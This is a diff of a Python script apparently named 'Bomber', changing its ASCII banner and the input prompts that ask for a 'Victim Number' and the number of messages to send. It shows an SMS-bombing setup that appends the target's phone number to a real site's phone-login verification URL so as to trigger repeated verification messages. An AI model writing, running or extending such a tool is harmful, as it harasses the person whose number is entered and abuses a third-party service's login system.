@@ -25,12 +25,12 @@ print(bired+"""
 
 
 
-                ︱Vincenzo︱
-    ____  ____  __  _ ______ __________
-   / __ )/ __ \/  |/  / __ )/ ____/ __ \
-  / __  / / / / /|_/ / __  / __/ / /_/ /
- / /_/ / /_/ / /  / / /_/ / /___/ _, _/
-/_____/\____/_/  /_/_____/_____/_/ |_|
+                  ︱Vincenzo︱
+        ____  ____  __  _ ______ __________
+       / __ )/ __ \/  |/  / __ )/ ____/ __ \
+      / __  / / / / /|_/ / __  / __/ / /_/ /
+     / /_/ / /_/ / /  / / /_/ / /___/ _, _/
+    /_____/\____/_/  /_/_____/_____/_/ |_|
 
 
 
@@ -81,12 +81,12 @@ os.system('clear')
 print(bigreen+"""\t
 
             
-                ︱Vincenzo︱
-    ____  ____  __  _ ______ __________
-   / __ )/ __ \/  |/  / __ )/ ____/ __ \
-  / __  / / / / /|_/ / __  / __/ / /_/ /
- / /_/ / /_/ / /  / / /_/ / /___/ _, _/
-/_____/\____/_/  /_/_____/_____/_/ |_|""")
+                  ︱Vincenzo︱
+       ____  ____  __  _ ______ __________
+      / __ )/ __ \/  |/  / __ )/ ____/ __ \
+     / __  / / / / /|_/ / __  / __/ / /_/ /
+    / /_/ / /_/ / /  / / /_/ / /___/ _, _/
+   /_____/\____/_/  /_/_____/_____/_/ |_|""")
 
 
 print ("""
@@ -108,10 +108,10 @@ print ("""
 
 import requests
 from requests.structures import CaseInsensitiveDict
-number  = str(input("[>] Provide Your Victim Num: "))
+number  = str(input("[>] Enter Your Victim Number: "))
 
 
-amount = int(input("[>] Provide Attack Amount: "))
+amount = int(input("[>] How Many Massege (Max - Unlimite): "))
 
 url0 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number+""
 
